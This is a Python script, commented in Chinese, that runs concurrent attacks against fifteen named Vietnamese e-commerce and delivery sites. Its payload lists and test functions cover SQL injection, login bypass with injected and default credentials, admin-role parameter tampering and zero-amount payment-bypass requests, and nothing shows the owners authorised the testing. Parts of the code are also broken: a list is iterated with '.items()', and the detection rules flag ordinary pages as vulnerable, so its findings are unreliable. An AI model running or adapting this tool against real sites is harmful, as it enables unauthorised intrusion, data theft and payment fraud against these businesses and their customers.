"""
越南目标完整版本漏洞严格验证工具
专注深度漏洞发现和全面安全评估
"""

import asyncio
import aiohttp
import json
import time
import logging
import random
import string
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
from enum import Enum
import re

# 配置日志
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger("VietnamValidator")

class VulnerabilityType(Enum):
    """漏洞类型枚举"""
    SQL_INJECTION = "SQL注入"
    AUTH_BYPASS = "认证绕过"
    BUSINESS_LOGIC = "业务逻辑漏洞"
    PAYMENT_BYPASS = "支付绕过"
    PRIVILEGE_ESCALATION = "权限提升"
    DATA_LEAKAGE = "数据泄露"
    COMMAND_INJECTION = "命令注入"
    XSS_VULNERABILITY = "XSS漏洞"
    CSRF_VULNERABILITY = "CSRF漏洞"
    WEAK_CONFIG = "安全配置错误"

class SeverityLevel(Enum):
    """严重级别枚举"""
    CRITICAL = "严重"
    HIGH = "高危"
    MEDIUM = "中危"
    LOW = "低危"

@dataclass
class Vulnerability:
    """完整漏洞信息"""
    target_name: str
    target_url: str
    vulnerability_type: VulnerabilityType
    severity: SeverityLevel
    description: str
    evidence: str
    payload_used: str
    impact: str
    exploitability: str
    remediation: str
    confidence_score: float
    timestamp: datetime

class ComprehensiveVietnamValidator:
    """越南目标完整版本验证器"""

    def __init__(self):
        self.session = None
        self.results = []

        # 越南高价值目标列表
        self.vietnam_targets = [
            {
                "name": "Tiki Marketplace",
                "url": "https://tiki.vn",
                "type": "ecommerce",
                "priority": "CRITICAL"
            },
            {
                "name": "Shopee Vietnam",
                "url": "https://shopee.vn",
                "type": "ecommerce",
                "priority": "CRITICAL"
            },
            {
                "name": "Lazada Vietnam",
                "url": "https://www.lazada.vn",
                "type": "ecommerce",
                "priority": "CRITICAL"
            },
            {
                "name": "GHN - Giao Hàng Nhanh",
                "url": "https://ghn.vn",
                "type": "logistics",
                "priority": "CRITICAL"
            },
            {
                "name": "GHTK - Giao Hàng Tiết Kiệm",
                "url": "https://ghtk.vn",
                "type": "logistics",
                "priority": "HIGH"
            },
            {
                "name": "Viettel Post",
                "url": "https://viettelpost.com.vn",
                "type": "logistics",
                "priority": "HIGH"
            },
            {
                "name": "VNPost",
                "url": "https://vnpost.vn",
                "type": "logistics",
                "priority": "HIGH"
            },
            {
                "name": "AhaMove",
                "url": "https://ahamove.com",
                "type": "logistics",
                "priority": "HIGH"
            },
            {
                "name": "The Gioi Di Dong",
                "url": "https://www.thegioididong.com",
                "type": "ecommerce",
                "priority": "HIGH"
            },
            {
                "name": "FPT Shop",
                "url": "https://fptshop.com.vn",
                "type": "ecommerce",
                "priority": "HIGH"
            },
            {
                "name": "CellphoneS",
                "url": "https://cellphones.com.vn",
                "type": "ecommerce",
                "priority": "HIGH"
            },
            {
                "name": "Sendo",
                "url": "https://sendo.vn",
                "type": "ecommerce",
                "priority": "MEDIUM"
            },
            {
                "name": "Tiki Now",
                "url": "https://tiki.now.vn",
                "type": "logistics",
                "priority": "MEDIUM"
            },
            {
                "name": "Be",
                "url": "https://be.vn",
                "type": "ecommerce",
                "priority": "MEDIUM"
            },
            {
                "name": "Phuc Long",
                "url": "https://phuclong.com.vn",
                "type": "ecommerce",
                "priority": "LOW"
            }
        ]

        # 完整SQL注入测试payload
        self.sql_injection_payloads = [
            # 基础SQL注入
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 'x'='x",
            "' OR 'a'='a",
            "' OR 1=1#",
            "' OR 1=1/*",

            # UNION查询注入
            "' UNION SELECT 1,2,3,4,5--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT username,password FROM users--",
            "' UNION SELECT table_name,column_name FROM information_schema.columns--",
            "' UNION SELECT database_name,version()--",

            # 时间盲注
            "' AND SLEEP(5)--",
            "' WAITFOR DELAY '0:0:5'--",
            "' AND BENCHMARK(10000000,MD5(NOW()))--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0 AND SLEEP(5)--",

            # 错误信息注入
            "' AND 1=CONVERT(INT,(SELECT TOP 1 table_name FROM information_schema.tables))--",
            "' AND 1=CONVERT(INT,(SELECT TOP 1 column_name FROM information_schema.columns))--",
            "' AND 1=CONVERT(INT,(SELECT TOP 1 username FROM users))--",
            "' AND 1=CONVERT(INT,(SELECT TOP 1 database_name FROM information_schema.schemata))--",

            # 布尔盲注
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND (SELECT COUNT(*) FROM users)>0--",
            "' AND (SELECT COUNT(*) FROM orders WHERE user_id=1)>0--",

            # 高级注入技术
            "' AND (SELECT COUNT(*) FROM (SELECT 1) AS a JOIN (SELECT 1) AS b JOIN (SELECT 1) AS c)--",
            "' AND 1=(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())--",
            "' AND ORD(MID((SELECT password FROM users LIMIT 1),1,1))>100--"
        ]

        # 完整认证绕过测试payload
        self.auth_bypass_payloads = [
            # SQL注入绕过
            {"username": "' OR '1'='1", "password": "anything"},
            {"username": "admin'--", "password": ""},
            {"username": "' OR 1=1#", "password": "any"},
            {"username": "' UNION SELECT 'admin','admin'--", "password": ""},

            # 默认凭证
            {"username": "admin", "password": "admin"},
            {"username": "admin", "password": "password"},
            {"username": "admin", "password": "123456"},
            {"username": "admin", "password": "root"},
            {"username": "administrator", "password": "administrator"},
            {"username": "administrator", "password": "admin"},

            # 弱密码
            {"username": "admin", "password": ""},
            {"username": "admin", "password": " "},
            {"username": "admin", "password": "changeme"},
            {"username": "admin", "password": "letmein"},

            # 高级绕过
            {"username": "admin' OR 1=1 #", "password": "anything"},
            {"username": "' UNION SELECT 'test','test' FROM users--", "password": ""},
            {"username": "admin' OR SLEEP(5)#", "password": "test"}
        ]

        # 业务逻辑漏洞测试
        self.business_logic_payloads = [
            {"admin": "true", "role": "administrator"},
            {"access_level": "999", "privilege": "all"},
            {"user_type": "admin", "permission": "full"},
            {"is_superuser": "true", "admin_flag": "1"},
            {"role": "admin", "level": "999"},
            {"status": "admin", "level": "999"},
            {"user_role": "administrator", "access_level": "999"},
            {"is_admin": "1", "admin_level": "999"},
            {"admin_access": "true", "full_access": "true"},
            {"system_role": "admin", "system_level": "999"}
        ]

        # 支付绕过测试
        self.payment_bypass_payloads = [
            {"payment_status": "paid", "amount": "0"},
            {"payment_completed": True, "total_amount": "0"},
            {"status": "success", "payment_amount": "0"},
            {"payment_approved": True, "order_total": "0"},
            {"transaction_status": "completed", "payment_sum": "0"},
            {"payment_verified": True, "order_amount": "0"}
        ]

    async def initialize_session(self):
        """初始化HTTP会话"""
        if not self.session:
            connector = aiohttp.TCPConnector(limit=100, force_close=False)
            timeout = aiohttp.ClientTimeout(total=30)
            self.session = aiohttp.ClientSession(
                connector=connector,
                timeout=timeout,
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive'
                }
            )

    async def test_sql_injection_comprehensive(self, target: Dict, url: str) -> List[Vulnerability]:
        """全面SQL注入测试"""
        vulnerabilities = []

        # 生成随机order_id参数
        test_params = [
            {"order_id": ""},
            {"order_id": "TEST123"},
            {"order_id": "1"},
            {"order_id": "'"},
            {"tracking_id": ""},
            {"tracking_id": "TN123456"},
            {"id": ""},
            {"id": "1"},
            {"search": ""},
            {"keyword": ""}
        ]

        for param_name, param_value in test_params.items():
            # 测试每个payload
            for payload in self.sql_injection_payloads:
                test_data = {param_name: payload}

                try:
                    # 测试GET请求
                    response = await self.session.get(url, params=test_data, timeout=10)
                    if response.status == 200:
                        response_text = await response.text()

                        # SQL注入检测
                        if self.detect_sql_injection_response(response_text, response.status, response.elapsed):
                            vuln = Vulnerability(
                                target_name=target["name"],
                                target_url=target["url"],
                                vulnerability_type=VulnerabilityType.SQL_INJECTION,
                                severity=SeverityLevel.CRITICAL,
                                description=f"参数化SQL注入漏洞 - 参数 {param_name}",
                                evidence=f"响应状态码: {response.status}, 响应时间: {response.elapsed.total_seconds()}s",
                                payload_used=payload,
                                impact="可能获取数据库完整数据，包括用户信息、订单数据等",
                                exploitability="利用简单，危害严重",
                                remediation="实施参数化查询，使用ORM框架，启用WAF",
                                confidence_score=0.9,
                                timestamp=datetime.now()
                            )
                            vulnerabilities.append(vuln)
                            logger.info(f"✅ 发现SQL注入漏洞: {target['name']} - {param_name}")

                    # 测试POST请求
                    response = await self.session.post(url, json=test_data, timeout=10)
                    if response.status == 200:
                        response_text = await response.text()

                        if self.detect_sql_injection_response(response_text, response.status, response.elapsed):
                            vuln = Vulnerability(
                                target_name=target["name"],
                                target_url=target["url"],
                                vulnerability_type=VulnerabilityType.SQL_INJECTION,
                                severity=SeverityLevel.CRITICAL,
                                description=f"POST参数SQL注入漏洞 - 参数 {param_name}",
                                evidence=f"响应状态码: {response.status}",
                                payload_used=payload,
                                impact="可能通过POST请求注入SQL代码",
                                exploitability="适合批量攻击",
                                remediation="实施严格的输入验证和参数化查询",
                                confidence_score=0.85,
                                timestamp=datetime.now()
                            )
                            vulnerabilities.append(vuln)
                            logger.info(f"✅ 发现POST SQL注入漏洞: {target['name']} - {param_name}")

                except Exception as e:
                    logger.debug(f"SQL注入测试异常: {e}")

        return vulnerabilities

    def detect_sql_injection_response(self, response_text: str, status_code: int, elapsed) -> bool:
        """检测SQL注入响应特征"""
        # SQL错误特征
        sql_error_indicators = [
            'sql syntax',
            'mysql_fetch_array',
            'you have an error in your sql',
            'ora-00933',
            'microsoft ole db provider',
            'postgresql',
            'sqlite',
            'query failed',
            'database error',
            'sql query failed'
        ]

        # 错误页面特征
        error_page_indicators = [
            'error',
            'exception',
            'traceback',
            'fatal error',
            'database error',
            'connection failed',
            'query failed'
        ]

        # 响应时间过长（时间盲注）
        if elapsed.total_seconds() > 3:
            return True

        # 检查错误特征
        response_lower = response_text.lower()
        sql_errors = any(indicator in response_lower for indicator in sql_error_indicators)
        error_pages = any(indicator in response_lower for indicator in error_page_indicators)

        # 异常长的响应（可能数据泄露）
        if len(response_text) > 5000:
            return True

        return sql_errors or error_pages

    async def test_authentication_bypass(self, target: Dict) -> List[Vulnerability]:
        """认证绕过测试"""
        vulnerabilities = []

        login_endpoints = [
            "/login",
            "/auth/login",
            "/admin/login",
            "/signin",
            "/user/login",
            "/account/login",
            "/api/auth/login",
            "/user/auth/login",
            "/oauth/login"
        ]

        for endpoint in login_endpoints:
            url = f"{target['url'].rstrip('/')}{endpoint}"

            for auth_payload in self.auth_bypass_payloads:
                try:
                    response = await self.session.post(url, json=auth_payload, timeout=10)

                    if response.status == 200:
                        response_text = await response.text()

                        # 检测认证成功
                        if self.detect_auth_success(response_text, response.headers):
                            vuln = Vulnerability(
                                target_name=target["name"],
                                target_url=target["url"],
                                vulnerability_type=VulnerabilityType.AUTH_BYPASS,
                                severity=SeverityLevel.CRITICAL,
                                description=f"认证绕过漏洞 - {auth_payload}",
                                evidence=f"响应状态码: {response.status}, 响应头: {dict(response.headers)}",
                                payload_used=str(auth_payload),
                                impact="完全访问系统权限",
                                exploitability="直接获取管理员权限",
                                remediation="实施强认证机制，启用多因素认证",
                                confidence_score=0.95,
                                timestamp=datetime.now()
                            )
                            vulnerabilities.append(vuln)
                            logger.info(f"✅ 发现认证绕过漏洞: {target['name']} - {endpoint}")
                            break

                except Exception as e:
                    logger.debug(f"认证测试异常: {e}")

        return vulnerabilities

    def detect_auth_success(self, response_text: str, headers) -> bool:
        """检测认证成功特征"""
        success_indicators = [
            'success', 'welcome', 'dashboard', 'admin',
            'logged in', 'authenticated', 'token',
            'session', 'cookie', 'set-cookie'
        ]

        response_lower = response_text.lower()
        header_text = str(headers).lower()

        return any(indicator in response_lower or indicator in header_text
                  for indicator in success_indicators)

    async def test_business_logic_vulnerabilities(self, target: Dict) -> List[Vulnerability]:
        """业务逻辑漏洞测试"""
        vulnerabilities = []

        api_endpoints = [
            "/api/orders",
            "/api/admin",
            "/api/user",
            "/api/settings",
            "/api/config",
            "/api/system",
            "/api/payment",
            "/api/checkout"
        ]

        for endpoint in api_endpoints:
            url = f"{target['url'].rstrip('/')}{endpoint}"

            # 测试业务逻辑payload
            for payload in self.business_logic_payloads:
                try:
                    response = await self.session.post(url, json=payload, timeout=10)

                    if response.status == 200:
                        response_text = await response.text()

                        if self.detect_business_logic_success(response_text):
                            vuln = Vulnerability(
                                target_name=target["name"],
                                target_url=target["url"],
                                vulnerability_type=VulnerabilityType.BUSINESS_LOGIC,
                                severity=SeverityLevel.HIGH,
                                description=f"业务逻辑漏洞 - {str(payload)}",
                                evidence=f"响应状态码: {response.status}, 响应内容: {response_text[:200]}",
                                payload_used=str(payload),
                                impact="可能提升权限或绕过业务控制",
                                exploitability="直接修改业务逻辑参数",
                                remediation="加强业务逻辑验证，实现服务端校验",
                                confidence_score=0.8,
                                timestamp=datetime.now()
                            )
                            vulnerabilities.append(vuln)
                            logger.info(f"✅ 发现业务逻辑漏洞: {target['name']} - {endpoint}")

                except Exception as e:
                    logger.debug(f"业务逻辑测试异常: {e}")

        return vulnerabilities

    def detect_business_logic_success(self, response_text: str) -> bool:
        """检测业务逻辑攻击成功"""
        success_indicators = [
            'success', 'ok', 'completed', 'updated',
            'admin', 'administrator', 'granted',
            'authorized', 'access granted', 'permission'
        ]

        response_lower = response_text.lower()
        return any(indicator in response_lower for indicator in success_indicators)

    async def test_payment_bypass_vulnerabilities(self, target: Dict) -> List[Vulnerability]:
        """支付绕过测试"""
        vulnerabilities = []

        payment_endpoints = [
            "/api/payment",
            "/checkout/process",
            "/payments/complete",
            "/orders/pay",
            "/payment/verify",
            "/payment/process"
        ]

        for endpoint in payment_endpoints:
            url = f"{target['url'].rstrip('/')}{endpoint}"

            for payload in self.payment_bypass_payloads:
                try:
                    response = await self.session.post(url, json=payload, timeout=10)

                    if response.status == 200:
                        response_text = await response.text()

                        if self.detect_payment_success(response_text):
                            vuln = Vulnerability(
                                target_name=target["name"],
                                target_url=target["url"],
                                vulnerability_type=VulnerabilityType.PAYMENT_BYPASS,
                                severity=SeverityLevel.CRITICAL,
                                description=f"支付绕过漏洞 - {str(payload)}",
                                evidence=f"响应状态码: {response.status}",
                                payload_used=str(payload),
                                impact="可能免支付完成订单",
                                exploitability="直接修改支付状态",
                                remediation="实现多重支付验证机制",
                                confidence_score=0.75,
                                timestamp=datetime.now()
                            )
                            vulnerabilities.append(vuln)
                            logger.info(f"✅ 发现支付绕过漏洞: {target['name']} - {endpoint}")

                except Exception as e:
                    logger.debug(f"支付测试异常: {e}")

        return vulnerabilities

    def detect_payment_success(self, response_text: str) -> bool:
        """检测支付绕过成功"""
        success_indicators = [
            'success', 'completed', 'paid', 'verified',
            'approved', 'processed', 'transaction completed'
        ]

        response_lower = response_text.lower()
        return any(indicator in response_lower for indicator in success_indicators)

    async def test_security_headers(self, target: Dict) -> List[Vulnerability]:
        """安全头测试"""
        vulnerabilities = []

        try:
            response = await self.session.get(target['url'], timeout=10)
            headers = dict(response.headers)

            missing_headers = []

            # 检查关键安全头
            if 'X-Content-Type-Options' not in headers:
                missing_headers.append('X-Content-Type-Options: nosniff')

            if 'X-Frame-Options' not in headers:
                missing_headers.append('X-Frame-Options: DENY')

            if 'X-XSS-Protection' not in headers:
                missing_headers.append('X-XSS-Protection: 1; mode=block')

            if 'Strict-Transport-Security' not in headers:
                missing_headers.append('Strict-Transport-Security: max-age=31536000')

            if 'Content-Security-Policy' not in headers:
                missing_headers.append('Content-Security-Policy')

            if missing_headers:
                vuln = Vulnerability(
                    target_name=target["name"],
                    target_url=target["url"],
                    vulnerability_type=VulnerabilityType.WEAK_CONFIG,
                    severity=SeverityLevel.MEDIUM,
                    description=f"安全配置错误 - 缺少安全头: {', '.join(missing_headers)}",
                    evidence=f"响应头: {headers}",
                    payload_used="安全头扫描",
                    impact="可能遭受XSS、点击劫持等攻击",
                    exploitability="配置错误导致的安全风险",
                    remediation="配置完整的安全响应头",
                    confidence_score=0.9,
                    timestamp=datetime.now()
                )
                vulnerabilities.append(vuln)

        except Exception as e:
            logger.debug(f"安全头测试异常: {e}")

        return vulnerabilities

    async def comprehensive_target_validation(self, target: Dict) -> List[Vulnerability]:
        """目标完整验证"""
        target_vulnerabilities = []

        logger.info(f"🔍 开始全面验证: {target['name']} ({target['url']})")

        # 1. 安全头测试
        try:
            target_vulnerabilities.extend(await self.test_security_headers(target))
        except Exception as e:
            logger.debug(f"安全头测试失败: {e}")

        # 2. SQL注入测试 - 订单相关端点
        order_endpoints = [
            "/api/orders",
            "/orders",
            "/order",
            "/checkout",
            "/payment",
            "/tracking"
        ]

        for endpoint in order_endpoints:
            try:
                url = f"{target['url'].rstrip('/')}{endpoint}"
                target_vulnerabilities.extend(await self.test_sql_injection_comprehensive(target, url))
            except Exception as e:
                logger.debug(f"端点测试失败 {endpoint}: {e}")

        # 3. 认证绕过测试
        try:
            target_vulnerabilities.extend(await self.test_authentication_bypass(target))
        except Exception as e:
            logger.debug(f"认证测试失败: {e}")

        # 4. 业务逻辑漏洞测试
        try:
            target_vulnerabilities.extend(await self.test_business_logic_vulnerabilities(target))
        except Exception as e:
            logger.debug(f"业务逻辑测试失败: {e}")

        # 5. 支付绕过测试
        try:
            target_vulnerabilities.extend(await self.test_payment_bypass_vulnerabilities(target))
        except Exception as e:
            logger.debug(f"支付测试失败: {e}")

        # 按严重级别排序
        target_vulnerabilities.sort(key=lambda x: self.severity_priority(x.severity), reverse=True)

        logger.info(f"✅ {target['name']} 验证完成，发现 {len(target_vulnerabilities)} 个漏洞")
        return target_vulnerabilities

    def severity_priority(self, severity: SeverityLevel) -> int:
        """严重级别优先级"""
        priority_map = {
            SeverityLevel.CRITICAL: 4,
            SeverityLevel.HIGH: 3,
            SeverityLevel.MEDIUM: 2,
            SeverityLevel.LOW: 1
        }
        return priority_map.get(severity, 0)

    async def run_comprehensive_validation(self):
        """运行完整验证"""
        await self.initialize_session()

        logger.info("🚀 开始越南目标完整版本漏洞严格验证")
        logger.info(f"目标总数: {len(self.vietnam_targets)}")

        # 并发验证所有目标
        tasks = []
        for target in self.vietnam_targets:
            task = asyncio.create_task(self.comprehensive_target_validation(target))
            tasks.append(task)

        results = await asyncio.gather(*tasks, return_exceptions=True)

        # 处理结果
        for i, result in enumerate(results):
            if isinstance(result, Exception):
                logger.error(f"验证失败 {self.vietnam_targets[i]['name']}: {result}")
            elif result:
                self.results.extend(result)
                target_name = self.vietnam_targets[i]['name']
                vuln_count = len(result)
                logger.info(f"📊 {target_name}: 发现 {vuln_count} 个漏洞")

        # 生成完整报告
        await self.generate_comprehensive_report()

    async def generate_comprehensive_report(self):
        """生成完整验证报告"""
        report = []
        report.append("=" * 80)
        report.append("🔍 越南目标完整版本漏洞严格验证报告")
        report.append("=" * 80)
        report.append(f"验证时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report.append(f"验证目标: {len(self.vietnam_targets)} 个越南系统")
        report.append("")

        # 统计结果
        total_vulnerabilities = len(self.results)
        critical_vulns = len([r for r in self.results if r.severity == SeverityLevel.CRITICAL])
        high_vulns = len([r for r in self.results if r.severity == SeverityLevel.HIGH])
        medium_vulns = len([r for r in self.results if r.severity == SeverityLevel.MEDIUM])
        low_vulns = len([r for r in self.results if r.severity == SeverityLevel.LOW])

        report.append("📊 漏洞统计汇总")
        report.append("-" * 40)
        report.append(f"总漏洞发现: {total_vulnerabilities}")
        report.append(f"严重级别漏洞: {critical_vulns}")
        report.append(f"高级别漏洞: {high_vulns}")
        report.append(f"中等级别漏洞: {medium_vulns}")
        report.append(f"低等级别漏洞: {low_vulns}")
        report.append("")

        # 按目标分类
        report.append("🎯 按目标分类的漏洞详情")
        report.append("-" * 40)

        target_results = {}
        for result in self.results:
            target_name = result.target_name
            if target_name not in target_results:
                target_results[target_name] = []
            target_results[target_name].append(result)

        for target_name, vulnerabilities in target_results.items():
            report.append(f"\n🏪 {target_name}")
            report.append(f"   发现漏洞: {len(vulnerabilities)} 个")

            severity_count = {}
            for vuln in vulnerabilities:
                severity_count[vuln.severity] = severity_count.get(vuln.severity, 0) + 1

            for severity, count in severity_count.items():
                icon = "🔴" if severity == SeverityLevel.CRITICAL else "🟠" if severity == SeverityLevel.HIGH else "🟡" if severity == SeverityLevel.MEDIUM else "🟢"
                report.append(f"   {icon} {severity.value}: {count} 个")

            # 详细漏洞列表
            for vuln in vulnerabilities[:3]:  # 显示前3个
                report.append(f"      • {vuln.vulnerability_type.value}: {vuln.description}")

            if len(vulnerabilities) > 3:
                report.append(f"      ... 还有 {len(vulnerabilities) - 3} 个漏洞")

            report.append("")

        # 按漏洞类型统计
        report.append("🔧 按漏洞类型统计")
        report.append("-" * 40)

        type_count = {}
        for result in self.results:
            vuln_type = result.vulnerability_type.value
            type_count[vuln_type] = type_count.get(vuln_type, 0) + 1

        for vuln_type, count in sorted(type_count.items(), key=lambda x: x[1], reverse=True):
            report.append(f"- {vuln_type}: {count} 个")
        report.append("")

        # 安全建议
        report.append("🛡️ 完整安全建议")
        report.append("-" * 40)
        report.append("Critical (立即修复 - 24小时内):")
        report.append("1. 立即修复所有SQL注入漏洞")
        report.append("2. 加强认证机制，防止认证绕过")
        report.append("3. 实施多重支付验证")
        report.append("")
        report.append("High (高优先级 - 1周内):")
        report.append("4. 修复业务逻辑漏洞")
        report.append("5. 部署Web应用防火墙(WAF)")
        report.append("6. 实施访问控制和权限管理")
        report.append("")
        report.append("Medium (中优先级 - 1月内):")
        report.append("7. 配置安全响应头")
        report.append("8. 建立异常监控和报警系统")
        report.append("9. 定期进行安全审计")
        report.append("")
        report.append("Low (低优先级 - 季度内):")
        report.append("10. 进行员工安全意识培训")
        report.append("11. 建立应急响应机制")
        report.append("")

        # 严重风险警告
        report.append("⚠️ 严重风险警告")
        report.append("-" * 40)
        if critical_vulns > 0:
            report.append("发现严重级别漏洞，建议立即采取以下措施:")
            report.append("- 立即暂停对外的Web服务")
            report.append("- 评估数据泄露风险")
            report.append("- 联系专业安全团队")
            report.append("- 准备应急响应计划")

        report.append("")
        report.append("=" * 80)
        report.append("完整版本漏洞验证完成 - 严格验证模式")
        report.append("=" * 80)

        # 保存完整报告
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"comprehensive_vietnam_validation_report_{timestamp}.txt"

        with open(filename, 'w', encoding='utf-8') as f:
            f.write('\n'.join(report))

        logger.info(f"📄 完整验证报告已保存: {filename}")
        print('\n'.join(report))

async def main():
    """主函数"""
    print("启动越南目标完整版本漏洞严格验证...")
    print("专注深度漏洞发现和全面安全评估")

    validator = ComprehensiveVietnamValidator()
    await validator.run_comprehensive_validation()

if __name__ == "__main__":
    asyncio.run(main())